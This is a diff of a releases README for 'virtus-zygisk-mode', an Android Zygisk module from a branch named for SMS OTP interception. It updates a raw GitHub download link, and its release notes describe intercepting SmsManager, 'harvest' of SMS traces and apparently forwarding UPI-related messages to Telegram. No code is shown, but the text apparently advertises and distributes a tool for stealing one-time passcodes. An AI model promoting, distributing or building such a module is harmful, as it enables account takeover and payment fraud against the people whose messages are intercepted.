@@ -1,7 +1,7 @@
 # Releases
 
-Latest: **virtus-zygisk-mode-v1.0.52.zip**
+Latest: **virtus-zygisk-mode-v1.0.53.zip**
 
-Hero SmsManager intercept + isms_trace harvest fix.
+Outgoing-only HEROAXISUPI + digit To, TG once (no OTP spam).
 
-https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.52.zip
+https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.53.zip
